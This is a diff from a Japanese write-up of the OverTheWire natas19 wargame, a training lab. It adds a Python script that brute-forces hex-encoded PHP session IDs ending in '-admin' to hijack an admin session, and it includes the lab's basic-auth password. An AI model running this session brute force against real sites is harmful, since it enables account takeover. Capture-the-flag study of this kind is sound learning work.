@@ -26,6 +26,31 @@ PHPSESSIDが`3236352d74657374`とある。
 前回使用したpythonコードを改変した以下のコードを使用する。  
 
 ```
+import requests
+import string
+from requests.auth import HTTPBasicAuth
 
+basicAuth=HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
+
+MAX = 640
+count = 1
+
+u="http://natas19.natas.labs.overthewire.org/index.php?debug"
+
+while count <= MAX:
+    sessionID = "PHPSESSID=" + (str(count) + "-admin").encode("utf-8").hex()
+    print(sessionID)
+
+    headers = {'Cookie': sessionID}
+    response = requests.get(u, headers=headers, auth=basicAuth, verify=False)
+
+    if "You are logged in as a regular user" not in response.text:
+        print(response.text)
+
+    count += 1
+
+print("Done!")
 ```
+
+実行してしばらく待つと、`281-admin`でflagが表示される。  
 
